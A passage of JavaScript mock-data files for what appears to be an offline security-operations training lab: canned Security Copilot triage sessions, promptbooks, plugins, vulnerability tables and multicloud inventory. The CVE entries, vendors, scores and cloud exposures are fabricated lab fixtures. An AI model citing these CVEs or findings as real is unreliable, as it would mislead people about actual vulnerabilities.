      { role: 'copilot', text: 'Yes. Isolate the host, stop the service account, and preserve the alert set for incident follow-up.', plugin: 'Defender XDR', skill: 'Containment', pinned: false }
    ]
  },
  {
    sessionId: 'cs-003',
    steps: [
      { role: 'analyst', text: 'I need to understand the OAuth app misuse timeline.', plugin: 'none', skill: 'Incident triage', pinned: true },
      { role: 'copilot', text: 'The user clicked a phishing URL, then consented to DocViewer Pro with broad mail and files scopes.', plugin: 'Defender XDR', skill: 'Timeline summarization', pinned: false },
      { role: 'analyst', text: 'What should I pivot on next?', plugin: 'none', skill: 'Entity pivots', pinned: true },
      { role: 'copilot', text: 'Expand the user, the app registration, the source IP, and the mailbox activity in CloudAppEvents.', plugin: 'Defender Threat Intelligence', skill: 'Entity expansion', pinned: false }
    ]
  },
  {
    sessionId: 'cs-004',
    steps: [
      { role: 'analyst', text: 'Purview flagged external sharing of sensitive files. What is the likely issue?', plugin: 'none', skill: 'Policy triage', pinned: true },
      { role: 'copilot', text: 'The file contains payment card data and was shared outside the tenant; the DLP policy tip is consistent with a real exfiltration risk.', plugin: 'Purview', skill: 'DLP review', pinned: false },
      { role: 'analyst', text: 'What are the response options?', plugin: 'none', skill: 'Response planning', pinned: true },
      { role: 'copilot', text: 'Review the override request, notify the user owner, and escalate to insider-risk or eDiscovery if the pattern repeats.', plugin: 'Purview', skill: 'Remediation', pinned: false }
    ]
  },
  {
    sessionId: 'cs-005',
    steps: [
      { role: 'analyst', text: 'Prioritize the vulnerability scan findings. What stands out?', plugin: 'none', skill: 'Exposure analysis', pinned: true },
      { role: 'copilot', text: 'CodeGenius and PDFXpert Pro have exploit-available CVEs with multiple exposed devices, so they should be first in line for remediation.', plugin: 'Defender XDR', skill: 'Prioritization', pinned: false },
      { role: 'analyst', text: 'Can this become a repeatable workflow?', plugin: 'none', skill: 'Operationalization', pinned: true },
      { role: 'copilot', text: 'Yes. Turn the pattern into a tracker item and route the remediation request to IT with an expiry date.', plugin: 'Sentinel', skill: 'Workflow suggestion', pinned: false }
    ]
  },
  {
    sessionId: 'cs-006',
    steps: [
      { role: 'analyst', text: 'Summarize the ransomware incident for leadership.', plugin: 'none', skill: 'Executive summary', pinned: true },
      { role: 'copilot', text: 'The incident is a confirmed ransomware event with service-account driven encryption, mapped network shares, and containment already underway.', plugin: 'Defender XDR', skill: 'Summarization', pinned: false },
      { role: 'analyst', text: 'What should be included in the headline?', plugin: 'none', skill: 'Decision support', pinned: true },
      { role: 'copilot', text: 'State the scope, containment actions, and restoration plan; avoid speculation about dwell time until forensics confirms it.', plugin: 'Defender XDR', skill: 'Leadership guidance', pinned: false }
    ]
  },
  {
    sessionId: 'cs-007',
    steps: [
      { role: 'analyst', text: 'These DNS lookups look noisy. What do you see?', plugin: 'none', skill: 'Threat hunting', pinned: true },
      { role: 'copilot', text: 'The burst contains repeated NXDOMAIN queries from one host plus suspicious responses from known proxy ranges, which is consistent with tunneling or beaconing.', plugin: 'Sentinel', skill: 'Pattern detection', pinned: false },
      { role: 'analyst', text: 'Can I ground this in indicators?', plugin: 'none', skill: 'Indicator enrichment', pinned: true },
      { role: 'copilot', text: 'Yes. Save the IPs and domains as indicators, then validate whether they appear in other alerts or in the hunting graph.', plugin: 'Defender Threat Intelligence', skill: 'TI enrichment', pinned: false }
    ]
  },
  {
    sessionId: 'cs-008',
    steps: [
      { role: 'analyst', text: 'Are these risky sign-ins likely compromise or travel?', plugin: 'none', skill: 'Identity triage', pinned: true },
      { role: 'copilot', text: 'The sign-in from an unfamiliar region is paired with risk detections, so the lab should treat it as suspicious until the user validates the activity.', plugin: 'Entra', skill: 'Risk interpretation', pinned: false },
      { role: 'analyst', text: 'What would you do next?', plugin: 'none', skill: 'Response planning', pinned: true },
      { role: 'copilot', text: 'Confirm or dismiss the risk, then decide whether to require password reset and revoke sessions.', plugin: 'Defender XDR', skill: 'Containment guidance', pinned: false }
    ]
  },
  {
    sessionId: 'cs-009',
    steps: [
      { role: 'analyst', text: 'Investigate INC-1042 end to end and decide if we contain the user.', plugin: 'none', skill: 'Agentic prompt', pinned: true },
      { role: 'copilot', text: 'The incident is a phishing-to-OAuth chain: user click, app consent, and follow-on mailbox access. Expand the user, app, and IP entities next.', plugin: 'Defender XDR', skill: 'Incident summary', pinned: false },
      { role: 'analyst', text: 'What tool calls should I make?', plugin: 'none', skill: 'Planning', pinned: true },
      { role: 'copilot', text: 'Query CloudAppEvents for DocViewer Pro, inspect SigninLogs for the unfamiliar IP, and review the mailbox for scope abuse.', plugin: 'Purview', skill: 'Tool planning', pinned: false },
      { role: 'analyst', text: 'Verdict?', plugin: 'none', skill: 'Decisioning', pinned: true },
      { role: 'copilot', text: 'Contain the user, revoke sessions, remove consent, and keep the case open until hunting shows no further abuse.', plugin: 'Defender XDR', skill: 'Verdict', pinned: false }
    ]
  }
];

// --- T03: out/t03-copilot-promptbooks.js ---
const COPILOT_PROMPTBOOKS = [
  {
    id: 'pb-01',
    name: 'Incident investigation',
    source: 'Hack Smarter Labs',
    description: 'Step-by-step triage of an incident.',
    inputs: ['Incident ID'],
    prompts: ['Summarize incident <ID>', 'List impacted entities', 'List related alerts', 'Suggest response actions', 'Draft an executive summary']
  },
  {
    id: 'pb-02',
    name: 'Suspicious script analysis',
    source: 'Hack Smarter Labs',
    description: 'Analyze suspicious scripts for potential threats.',
    inputs: [],
    prompts: ['Identify the purpose of <script>', 'Check against known malware patterns', 'Examine network activity related to <script>', 'Suggest next steps']
  },
  {
    id: 'pb-03',
    name: 'Threat actor profile',
    source: 'Hack Smarter Labs',
    description: 'Develop a profile of the threat actor based on attack patterns.',
    inputs: ['Device name'],
    prompts: ['List recent activity by <device>', 'Identify common tactics and techniques used', 'Suggest potential motivations']
  },
  {
    id: 'pb-04',
    name: 'Vulnerability impact assessment',
    source: 'Hack Smarter Labs',
    description: 'Assess the risk of a vulnerability exploit.',
    inputs: [],
    prompts: ['Describe the vulnerability', 'Estimate potential damage', 'Suggest remediation steps']
  },
  {
    id: 'pb-05',
    name: 'User compromise assessment',
    source: 'Hack Smarter Labs',
    description: 'Evaluate the risk of user data breaches.',
    inputs: [],
    prompts: ['Identify potential access vectors', 'Determine impacted users and data', 'Suggest containment actions']
  },
  {
    id: 'pb-06',
    name: 'Email threat triage',
    source: 'Hack Smarter Labs',
    description: 'Triage incoming emails for potential threats.',
    inputs: ['Incident ID'],
    prompts: ['Summarize email content <ID>', 'Check against known phishing patterns', 'Analyze sender behavior', 'Suggest actions']
  },
  {
    id: 'pb-07',
    name: 'Shift handoff summary',
    source: 'Custom',
    description: 'Compile a summary of ongoing incidents for oncoming analysts.',
    inputs: [],
    prompts: ['List unresolved incidents', 'Highlight key findings and issues', 'Provide recommendations']
  },
  {
    id: 'pb-08',
    name: 'Threat hunting playbook',
    source: 'Custom',
    description: 'Detailed steps for proactive threat hunting activities.',
    inputs: [],
    prompts: ['Outline objectives and scope', 'Describe detection criteria', 'Suggest initial actions']
  }
];

// --- T04: out/t04-copilot-plugins.js ---
const COPILOT_PLUGINS = [
  {
    id: 'pl-01',
    name: 'Defender XDR - Incident context',
    category: 'First-party',
    status: 'On',
    description: 'Summarizes incidents, alerts, and entity pivots from Defender XDR.',
    setupNote: 'Grant Security Copilot access to the Defender workload and incident data.'
  },
  {
    id: 'pl-02',
    name: 'Sentinel - Workspace context',
    category: 'First-party',
    status: 'On',
    description: 'Pulls hunting queries, incidents, and workbook context from Sentinel.',
    setupNote: 'Pick the target workspace before asking Copilot to explain Sentinel data.'
  },
  {
    id: 'pl-03',
    name: 'Entra - Identity context',
    category: 'First-party',
    status: 'On',
    description: 'Brings sign-in risk, user risk, and directory audit details into answers.',
    setupNote: 'Enable the identity plugin for the tenant that holds the sign-in logs.'
  },
  {
    id: 'pl-04',
    name: 'Intune - Device context',
    category: 'First-party',
    status: 'On',
    description: 'Adds device posture and management context for endpoint questions.',
    setupNote: 'Connect the managed device source so Copilot can ground device-centric responses.'
  },
  {
    id: 'pl-05',
    name: 'Defender Threat Intelligence - Indicator enrichment',
    category: 'First-party',
    status: 'Off',
    description: 'Enriches IP, domain, and file indicators with threat intelligence context.',
    setupNote: 'Turn it on when you want Copilot to explain indicators before writing hunts.'
  },
  {
    id: 'pl-06',
    name: 'Purview - Content security context',
    category: 'First-party',
    status: 'On',
    description: 'Grounds answers in DLP, audit, and eDiscovery content clues.',
    setupNote: 'Connect the Purview sources used in the lab tenant.'
  },
  {
    id: 'pl-07',
    name: 'Fabrikam SIEM - Custom triage bridge',
    category: 'Third-party',
    status: 'Off',
    description: 'Adds a fictional third-party alert feed used for lab comparisons.',
    setupNote: 'Enable the connector only when cross-platform alert blending is being studied.'
  },
  {
    id: 'pl-08',
    name: 'NetScope CASB - Cloud app risk feed',
    category: 'Third-party',
    status: 'Off',
    description: 'Represents a third-party cloud app risk source with OAuth and file activity.',
    setupNote: 'Use it as a stand-in for third-party app governance context.'
  },
  {
    id: 'pl-09',
    name: 'KQL Debugger - Query optimization tool',
    category: 'Custom',
    status: 'On',
    description: 'Helps draft and shorten KQL for local lab hunts.',
    setupNote: 'No extra setup required in the offline lab.'
  },
  {
    id: 'pl-10',
    name: 'Promptbook Runner - Guided session builder',
    category: 'Custom',
    status: 'On',
    description: 'Runs local promptbooks and records the resulting canned session.',
    setupNote: 'Stores generated sessions in browser storage.'
  },
  {
    id: 'pl-11',
    name: 'Case Notes Copier - Analyst helper',
    category: 'Custom',
    status: 'Off',
    description: 'Provides a static example of a custom workflow plugin.',
    setupNote: 'Use it to compare custom plugin ordering against first-party plugins.'
  }
];

// --- T05: out/t05-copilot-capacity.js ---
const COPILOT_USAGE = [
  { date: '2026-06-15', unitsUsed: 4.9, sessions: 7 },
  { date: '2026-06-16', unitsUsed: 4.8, sessions: 6 },
  { date: '2026-06-17', unitsUsed: 4.3, sessions: 5 },
  { date: '2026-06-18', unitsUsed: 4.5, sessions: 5 },
  { date: '2026-06-19', unitsUsed: 4.2, sessions: 4 },
  { date: '2026-06-20', unitsUsed: 3.8, sessions: 6 },
  { date: '2026-06-21', unitsUsed: 3.9, sessions: 6 },
  { date: '2026-06-22', unitsUsed: 4.7, sessions: 8 },
  { date: '2026-06-23', unitsUsed: 5.1, sessions: 9 },
  { date: '2026-06-24', unitsUsed: 4.7, sessions: 8 },
  { date: '2026-06-25', unitsUsed: 4.3, sessions: 7 },
  { date: '2026-06-26', unitsUsed: 3.9, sessions: 6 },
  { date: '2026-06-27', unitsUsed: 4.1, sessions: 7 },
  { date: '2026-06-28', unitsUsed: 3.5, sessions: 5 }
];

const COPILOT_CAPACITY = {
  provisionedSCU: 6,
  overageAllowed: true,
  region: 'Europe',
  owners: ['R. Vance', 'M. Okafor']
};

const COPILOT_SETTINGS_DEFAULTS = {
  ...COPILOT_CAPACITY,
  ownerRole: 'Contributor',
  dataSharing: true,
  logging: true,
  tenant: 'Hack Smarter Labs',
  dailyLimit: 8,
};

// --- T06: out/t06-tvm.js ---
const TVM_SOFTWARE = [
  { id:'sw-01', name:'CodeGenius', vendor:'TechNova', version:'5.2.3', weaknesses:4, exposedDevices:7, threatInsight:'Exploit available', recommendationId:'tr-01', topCves:['CVE-2026-9001','CVE-2026-9002'], deviceCount:2 },
  { id:'sw-02', name:'DataMaster Pro', vendor:'InfoForge', version:'2.8.1', weaknesses:6, exposedDevices:12, threatInsight:'Active alert', recommendationId:'tr-02', topCves:['CVE-2026-9003','CVE-2026-9004'], deviceCount:2 },
  { id:'sw-03', name:'OfficeSuite Premium', vendor:'OffiSys', version:'4.5.0', weaknesses:2, exposedDevices:28, threatInsight:'Needs patch', recommendationId:'tr-03', topCves:['CVE-2026-9005','CVE-2026-9006'], deviceCount:3 },
  { id:'sw-04', name:'CryptoSecure', vendor:'SecuroTech', version:'1.9.3', weaknesses:7, exposedDevices:6, threatInsight:'Exploit available', recommendationId:'tr-04', topCves:['CVE-2026-9007','CVE-2026-9023'], deviceCount:2 },
  { id:'sw-05', name:'VideoEditor Suite', vendor:'Vidsoft', version:'3.2.2', weaknesses:1, exposedDevices:34, threatInsight:'Active alert', recommendationId:'tr-05', topCves:['CVE-2026-9009'], deviceCount:1 },
  { id:'sw-06', name:'PDFXpert Pro', vendor:'DocuMaster', version:'3.7', weaknesses:8, exposedDevices:21, threatInsight:'Exploit available', recommendationId:'tr-06', topCves:['CVE-2026-9011','CVE-2026-9012'], deviceCount:2 },
  { id:'sw-07', name:'ImageMagick Pro', vendor:'ImagoSys', version:'6.5.4', weaknesses:3, exposedDevices:9, threatInsight:'None', recommendationId:'tr-07', topCves:['CVE-2026-9013'], deviceCount:1 },
  { id:'sw-08', name:'AudioMaster XL', vendor:'Sonicscape', version:'1.2.1', weaknesses:3, exposedDevices:6, threatInsight:'Exploit available', recommendationId:'tr-08', topCves:['CVE-2026-9015'], deviceCount:1 },
  { id:'sw-09', name:'SecuritySuite Pro', vendor:'SecuTech', version:'4.1.5', weaknesses:6, exposedDevices:2, threatInsight:'Review exceptions', recommendationId:'tr-09', topCves:['CVE-2026-9017'], deviceCount:2 },
  { id:'sw-10', name:'DataFlow X', vendor:'BitStream', version:'3.8', weaknesses:9, exposedDevices:14, threatInsight:'Active alert', recommendationId:'tr-10', topCves:['CVE-2026-9019','CVE-2026-9021'], deviceCount:2 }
];

const TVM_CVES = [
  { id:'cv-01', cve:'CVE-2026-9001', severity:'Critical', cvss:8.5, software:'CodeGenius', exploitAvailable:true, exposedDevices:4, affectedDevices:['WKS-01','WKS-03'], summary:'Remote execution in the plugin loader', remediation:'Update CodeGenius to 5.2.4' },
  { id:'cv-02', cve:'CVE-2026-9003', severity:'High', cvss:7.1, software:'DataMaster Pro', exploitAvailable:false, exposedDevices:10, affectedDevices:['DC01','WKS-02'], summary:'Privilege escalation through report macros', remediation:'Apply vendor hotfix and review macro usage' },
  { id:'cv-03', cve:'CVE-2026-9005', severity:'Critical', cvss:8.8, software:'OfficeSuite Premium', exploitAvailable:true, exposedDevices:35, affectedDevices:['WKS-01','WKS-02','WKS-03'], summary:'Untrusted add-in launch leads to code execution', remediation:'Patch OfficeSuite Premium' },
  { id:'cv-04', cve:'CVE-2026-9007', severity:'Medium', cvss:5.3, software:'CryptoSecure', exploitAvailable:false, exposedDevices:8, affectedDevices:['DC01','FIN-FS-02'], summary:'Crypto library mishandles certificate validation', remediation:'Upgrade CryptoSecure and reissue certificates' },
  { id:'cv-05', cve:'CVE-2026-9009', severity:'Critical', cvss:9.4, software:'VideoEditor Suite', exploitAvailable:true, exposedDevices:30, affectedDevices:['FIN-FS-02'], summary:'Project import parser leads to arbitrary code execution', remediation:'Isolate editor build and deploy the patched release' },
  { id:'cv-06', cve:'CVE-2026-9011', severity:'High', cvss:7.8, software:'PDFXpert Pro', exploitAvailable:false, exposedDevices:25, affectedDevices:['WKS-03','WKS-02'], summary:'Malformed PDF can trigger process crash and memory corruption', remediation:'Update PDFXpert Pro' },
  { id:'cv-07', cve:'CVE-2026-9013', severity:'Low', cvss:2.4, software:'ImageMagick Pro', exploitAvailable:false, exposedDevices:15, affectedDevices:['WKS-01'], summary:'Image conversion bug exposes low-risk memory corruption', remediation:'Upgrade when the next maintenance window opens' },
  { id:'cv-08', cve:'CVE-2026-9015', severity:'Critical', cvss:8.3, software:'AudioMaster XL', exploitAvailable:true, exposedDevices:6, affectedDevices:['WKS-02'], summary:'Malicious sample library can launch code on load', remediation:'Patch AudioMaster XL before the next scan' },
  { id:'cv-09', cve:'CVE-2026-9017', severity:'Medium', cvss:5.7, software:'SecuritySuite Pro', exploitAvailable:false, exposedDevices:4, affectedDevices:['DC01','WKS-01'], summary:'Policy engine allows stale allow-list entries', remediation:'Review allow-list scope and update SecuritySuite Pro' },
  { id:'cv-10', cve:'CVE-2026-9019', severity:'Critical', cvss:8.6, software:'DataFlow X', exploitAvailable:true, exposedDevices:18, affectedDevices:['FIN-FS-02','WKS-02'], summary:'Pipeline connector can be abused to run a payload', remediation:'Patch DataFlow X and validate connector rules' },
  { id:'cv-11', cve:'CVE-2026-9021', severity:'High', cvss:7.6, software:'OfficeSuite Premium', exploitAvailable:false, exposedDevices:30, affectedDevices:['WKS-01','WKS-02','WKS-03'], summary:'Document preview can leak process memory', remediation:'Apply OfficeSuite Premium update' },
  { id:'cv-12', cve:'CVE-2026-9023', severity:'Low', cvss:4.5, software:'CryptoSecure', exploitAvailable:true, exposedDevices:7, affectedDevices:['FIN-FS-02'], summary:'Legacy cipher negotiation bypasses policy checks', remediation:'Retire the legacy cipher suite in CryptoSecure' }
];

const TVM_RECOMMENDATIONS = [
  { id:'tr-01', title:'Update CodeGenius to version 5.2.4', software:'CodeGenius', exposedDevices:6, impact:8.2, status:'Active', owner:'Endpoint engineering', due:'2026-07-11T16:00:00Z', scope:'Finance workstation group', handoff:'Package the fix through Intune remediation so the patched binary reaches the pilot ring first.', devices:['WKS-01','WKS-03'] },
  { id:'tr-02', title:'Fix DataMaster Pro vulnerabilities', software:'DataMaster Pro', exposedDevices:12, impact:5.9, status:'Exception', owner:'Finance IT', due:'2026-07-31T16:00:00Z', scope:'Finance workstation group', handoff:'Track the vendor hotfix and keep the exception scoped to the finance pilot ring.', devices:['DC01','WKS-02'] },
  { id:'tr-03', title:'Update OfficeSuite Premium to latest version', software:'OfficeSuite Premium', exposedDevices:28, impact:6.7, status:'Active', owner:'Desktop engineering', due:'2026-07-09T16:00:00Z', scope:'Office users', handoff:'Roll the updated build to Office workstations before the next document review cycle.', devices:['WKS-01','WKS-02','WKS-03'] },
  { id:'tr-04', title:'Upgrade CryptoSecure version', software:'CryptoSecure', exposedDevices:6, impact:4.5, status:'Completed', owner:'Identity platform', due:'2026-07-04T16:00:00Z', scope:'Domain controllers', handoff:'Certificate trust validation completed and the new CryptoSecure version is in place.', devices:['DC01','FIN-FS-02'] },
  { id:'tr-05', title:'Resolve VideoEditor Suite issues', software:'VideoEditor Suite', exposedDevices:34, impact:9.1, status:'In progress', owner:'Media production IT', due:'2026-07-08T16:00:00Z', scope:'Video editors', handoff:'Cut over the affected hosts after the patched release clears validation.', devices:['FIN-FS-02'] },
  { id:'tr-06', title:'Secure PDFXpert Pro', software:'PDFXpert Pro', exposedDevices:21, impact:7.8, status:'Exception', owner:'Workstation engineering', due:'2026-07-22T16:00:00Z', scope:'Finance file server', handoff:'Document why the exception is needed, then re-test when the vendor release lands.', devices:['WKS-02','WKS-03'] },
  { id:'tr-07', title:'Patch ImageMagick Pro', software:'ImageMagick Pro', exposedDevices:9, impact:3.4, status:'Completed', owner:'Desktop engineering', due:'2026-07-05T16:00:00Z', scope:'Image processing workstations', handoff:'The image-processing build was updated during the weekend maintenance window.', devices:['WKS-01'] },
  { id:'tr-08', title:'Address AudioMaster XL flaws', software:'AudioMaster XL', exposedDevices:6, impact:7.2, status:'Active', owner:'Endpoint engineering', due:'2026-07-10T16:00:00Z', scope:'Audio editing workstations', handoff:'Stage the fix and remove the vulnerable sample library package.', devices:['WKS-02'] },
  { id:'tr-09', title:'Review SecuritySuite Pro allow-list drift', software:'SecuritySuite Pro', exposedDevices:4, impact:5.1, status:'Active', owner:'Threat hunting', due:'2026-07-14T16:00:00Z', scope:'Tier 0 servers and priority workstations', handoff:'Check the allow-list entries before making a remediation decision.', devices:['DC01','WKS-01'] },
  { id:'tr-10', title:'Patch DataFlow X connector parsing', software:'DataFlow X', exposedDevices:14, impact:8.9, status:'Active', owner:'Platform engineering', due:'2026-07-12T16:00:00Z', scope:'Finance servers and analysis workstations', handoff:'Treat the connector parser update as a blocking change for the exposed devices.', devices:['FIN-FS-02','WKS-02'] }
];

const TVM_REMEDIATION_TRACKER = [
  { id:'rt-001', recommendationId:'tr-01', title:'Update CodeGenius to version 5.2.4', status:'In progress', owner:'Endpoint engineering', due:'2026-07-11T16:00:00Z', scope:'Finance workstation group', handoff:'Intune remediation package staged to the pilot ring', progress:'40%', createdAt:'2026-07-06T09:15:00Z' },
  { id:'rt-002', recommendationId:'tr-05', title:'Resolve VideoEditor Suite issues', status:'Waiting on approval', owner:'Media production IT', due:'2026-07-08T16:00:00Z', scope:'Video editors', handoff:'Patch window request sent to operations', progress:'20%', createdAt:'2026-07-06T10:10:00Z' },
  { id:'rt-003', recommendationId:'tr-08', title:'Address AudioMaster XL flaws', status:'Draft', owner:'Endpoint engineering', due:'2026-07-10T16:00:00Z', scope:'Audio editing workstations', handoff:'Need change approval before deployment', progress:'10%', createdAt:'2026-07-06T11:40:00Z' },
  { id:'rt-004', recommendationId:'tr-10', title:'Patch DataFlow X connector parsing', status:'In progress', owner:'Platform engineering', due:'2026-07-12T16:00:00Z', scope:'Finance servers and analysis workstations', handoff:'Connector update under validation', progress:'55%', createdAt:'2026-07-06T12:20:00Z' }
];

const TVM_EXCEPTIONS = [
  { id:'ex-001', recommendationId:'tr-02', title:'Fix DataMaster Pro vulnerabilities', justification:'Vendor hotfix is not yet available for the finance pilot build.', scope:'Finance workstation group', expires:'2026-07-31T23:59:00Z', owner:'Me', status:'Approved', createdAt:'2026-07-06T11:32:00Z' },
  { id:'ex-002', recommendationId:'tr-06', title:'Secure PDFXpert Pro', justification:'The finance file server needs the current build until the archival export is complete.', scope:'Finance file server', expires:'2026-07-22T23:59:00Z', owner:'workstation-engineering', status:'Approved', createdAt:'2026-07-06T12:05:00Z' }
];

const TVM_DEVICE_VULNS = {
  'WKS-03': {
    exposureScore: 92,
    software: [
      { name:'CodeGenius', version:'5.2.3', vendor:'TechNova', weaknessCount:4, recommendationId:'tr-01' },
      { name:'OfficeSuite Premium', version:'4.5.0', vendor:'OffiSys', weaknessCount:2, recommendationId:'tr-03' },
      { name:'PDFXpert Pro', version:'3.7', vendor:'DocuMaster', weaknessCount:8, recommendationId:'tr-06' },
    ],
    vulnerabilities: [
      { cve:'CVE-2026-9001', severity:'Critical', cvss:8.5, software:'CodeGenius', exploitAvailable:true, affectedDevices:4, status:'Exposed' },
      { cve:'CVE-2026-9011', severity:'High', cvss:7.8, software:'PDFXpert Pro', exploitAvailable:false, affectedDevices:25, status:'Exposed' },
      { cve:'CVE-2026-9021', severity:'High', cvss:7.6, software:'OfficeSuite Premium', exploitAvailable:false, affectedDevices:30, status:'Exposed' },
    ],
    recommendations: ['tr-01','tr-03','tr-06'],
  },
  'FIN-FS-02': {
    exposureScore: 88,
    software: [
      { name:'VideoEditor Suite', version:'3.2.2', vendor:'Vidsoft', weaknessCount:1, recommendationId:'tr-05' },
      { name:'DataFlow X', version:'3.8', vendor:'BitStream', weaknessCount:9, recommendationId:'tr-10' },
      { name:'CryptoSecure', version:'1.9.3', vendor:'SecuroTech', weaknessCount:7, recommendationId:'tr-04' },
    ],
    vulnerabilities: [
      { cve:'CVE-2026-9009', severity:'Critical', cvss:9.4, software:'VideoEditor Suite', exploitAvailable:true, affectedDevices:30, status:'Exposed' },
      { cve:'CVE-2026-9019', severity:'Critical', cvss:8.6, software:'DataFlow X', exploitAvailable:true, affectedDevices:18, status:'Exposed' },
      { cve:'CVE-2026-9007', severity:'Medium', cvss:5.3, software:'CryptoSecure', exploitAvailable:false, affectedDevices:8, status:'Exposed' },
    ],
    recommendations: ['tr-04','tr-05','tr-10'],
  },
  'WKS-01': {
    exposureScore: 73,
    software: [
      { name:'CodeGenius', version:'5.2.3', vendor:'TechNova', weaknessCount:4, recommendationId:'tr-01' },
      { name:'ImageMagick Pro', version:'6.5.4', vendor:'ImagoSys', weaknessCount:3, recommendationId:'tr-07' },
      { name:'SecuritySuite Pro', version:'4.1.5', vendor:'SecuTech', weaknessCount:6, recommendationId:'tr-09' },
    ],
    vulnerabilities: [
      { cve:'CVE-2026-9001', severity:'Critical', cvss:8.5, software:'CodeGenius', exploitAvailable:true, affectedDevices:4, status:'Exposed' },
      { cve:'CVE-2026-9013', severity:'Low', cvss:2.4, software:'ImageMagick Pro', exploitAvailable:false, affectedDevices:15, status:'Exposed' },
      { cve:'CVE-2026-9017', severity:'Medium', cvss:5.7, software:'SecuritySuite Pro', exploitAvailable:false, affectedDevices:4, status:'Exposed' },
    ],
    recommendations: ['tr-01','tr-07','tr-09'],
  },
  'WKS-02': {
    exposureScore: 69,
    software: [
      { name:'OfficeSuite Premium', version:'4.5.0', vendor:'OffiSys', weaknessCount:2, recommendationId:'tr-03' },
      { name:'PDFXpert Pro', version:'3.7', vendor:'DocuMaster', weaknessCount:8, recommendationId:'tr-06' },
      { name:'AudioMaster XL', version:'1.2.1', vendor:'Sonicscape', weaknessCount:3, recommendationId:'tr-08' },
    ],
    vulnerabilities: [
      { cve:'CVE-2026-9005', severity:'Critical', cvss:8.8, software:'OfficeSuite Premium', exploitAvailable:true, affectedDevices:35, status:'Exposed' },
      { cve:'CVE-2026-9011', severity:'High', cvss:7.8, software:'PDFXpert Pro', exploitAvailable:false, affectedDevices:25, status:'Exposed' },
      { cve:'CVE-2026-9015', severity:'Critical', cvss:8.3, software:'AudioMaster XL', exploitAvailable:true, affectedDevices:6, status:'Exposed' },
    ],
    recommendations: ['tr-03','tr-06','tr-08'],
  },
  'DC01': {
    exposureScore: 61,
    software: [
      { name:'DataMaster Pro', version:'2.8.1', vendor:'InfoForge', weaknessCount:6, recommendationId:'tr-02' },
      { name:'SecuritySuite Pro', version:'4.1.5', vendor:'SecuTech', weaknessCount:6, recommendationId:'tr-09' },
      { name:'CryptoSecure', version:'1.9.3', vendor:'SecuroTech', weaknessCount:7, recommendationId:'tr-04' },
    ],
    vulnerabilities: [
      { cve:'CVE-2026-9003', severity:'High', cvss:7.1, software:'DataMaster Pro', exploitAvailable:false, affectedDevices:10, status:'Exposed' },
      { cve:'CVE-2026-9017', severity:'Medium', cvss:5.7, software:'SecuritySuite Pro', exploitAvailable:false, affectedDevices:4, status:'Exposed' },
      { cve:'CVE-2026-9023', severity:'Low', cvss:4.5, software:'CryptoSecure', exploitAvailable:true, affectedDevices:7, status:'Exposed' },
    ],
    recommendations: ['tr-02','tr-04','tr-09'],
  },
};

const TVM_EXPOSURE_TREND = [
  { date:'2026-06-30', score:72 },
  { date:'2026-07-01', score:71 },
  { date:'2026-07-02', score:69 },
  { date:'2026-07-03', score:68 },
  { date:'2026-07-06', score:65 }
];

// --- T07: out/t07-multicloud.js ---
// Defender for Cloud security connectors. A connector is an Azure resource, so
// `id` uses the real ARM path shape and the cloud-native identifiers follow each
// provider's own conventions: AWS accounts are 12 digits and authenticate with an
// assumed IAM role; GCP has a string project ID plus a numeric project number and
// authenticates through workload identity federation.
const MC_CONNECTORS = [
  {
    id: '/subscriptions/8a41c7d2-5e93-4b16-9f70-2c6d05ea38b1/resourceGroups/rg-security-prod/providers/Cloud.Security/securityConnectors/hacksmarterlabs-aws-prod',
    name: 'hacksmarterlabs-aws-prod',
    cloud: 'AWS',
    accountId: '481512376904',
    accountAlias: 'hacksmarterlabs-production',
    scope: 'Single account',
    regions: ['us-east-1', 'eu-west-1'],
    authentication: 'Assume role',
    principal: 'arn:aws:iam::481512376904:role/DefenderForCloud-Scanner',
    deployment: 'CloudFormation stack DefenderForCloud-481512376904',
    plans: ['CSPM','Servers'],
    health: 'Healthy',
    healthDetail: 'All enabled plans are reporting. The last inventory scan completed with no permission errors.',
    lastSync: '2026-06-15T12:00:00.000Z'
  },
  {
    id: '/subscriptions/8a41c7d2-5e93-4b16-9f70-2c6d05ea38b1/resourceGroups/rg-security-prod/providers/Cloud.Security/securityConnectors/hacksmarterlabs-gcp-prod',
    name: 'hacksmarterlabs-gcp-prod',
    cloud: 'GCP',
    accountId: 'hacksmarterlabs-prod-4821',
    projectNumber: '638274195063',
    organizationId: '419028375162',
    scope: 'Single project',
    regions: ['us-central1', 'europe-west3'],
    authentication: 'Workload identity federation',
    principal: 'defender-cspm@hacksmarterlabs-prod-4821.iam.gserviceaccount.com',
    deployment: 'Cloud Shell bootstrap — workload identity pool defender-for-cloud',
    plans: ['CSPM','Containers','Databases'],
    health: 'Warning',
    healthDetail: 'Databases plan is degraded: the Cloud SQL Admin API is not enabled on hacksmarterlabs-prod-4821, so Cloud SQL instances in europe-west3 are not being assessed.',
    lastSync: '2026-06-14T18:30:00.000Z'
  }
];

// Multicloud inventory. Names, identifiers, and regions follow each provider's own
// conventions — AWS EC2 shows up by instance ID with its Name tag alongside, GCP by
// resource name — because that is how these rows read in the real portal. `alerts`
// matches the alerts that actually exist in MC_ALERTS rather than a flat count.
const MC_RESOURCES = [
  {
    id: 'res-a-bbbb2222-7',
    cloud: 'GCP',
    type: 'Container cluster',
    name: 'gke-hacksmarterlabs-payments-euw3',
    resourceId: 'projects/proj-aaaa1111/locations/europe-west3/clusters/gke-hacksmarterlabs-payments-euw3',
    region: 'europe-west3',
    riskLevel: 'High',
    exposure: 'Control plane authorized networks allow 0.0.0.0/0',
    alerts: 0,
    recs: 5
  },
  {
    id: 'res-b-aaaa1111-9',
    cloud: 'AWS',
    type: 'EC2 instance',
    name: 'i-0b8d41f7c9a2e6f35',
    displayName: 'prd-web-euw1-03',
    resourceId: 'arn:aws:ec2:eu-west-1:111122223333:instance/i-0b8d41f7c9a2e6f35',
    region: 'eu-west-1',
    riskLevel: 'Medium',
    exposure: 'Security group allows 22/tcp from 0.0.0.0/0',
    alerts: 1,
    recs: 4
  },
  {
    id: 'res-c-bbbb2222-3',
    cloud: 'GCP',
    type: 'Compute instance',
    name: 'hacksmarterlabs-prod-web-uc1-a3',
    resourceId: 'projects/proj-aaaa1111/zones/us-central1-a/instances/hacksmarterlabs-prod-web-uc1-a3',
    region: 'us-central1',
    riskLevel: 'Low',
    exposure: 'Behind external HTTPS load balancer',
    alerts: 0,
    recs: 2
  },
  {
    id: 'res-d-bbbb2222-4',
    cloud: 'GCP',
    type: 'Compute instance',
    name: 'hacksmarterlabs-prod-batch-uc1-b7',
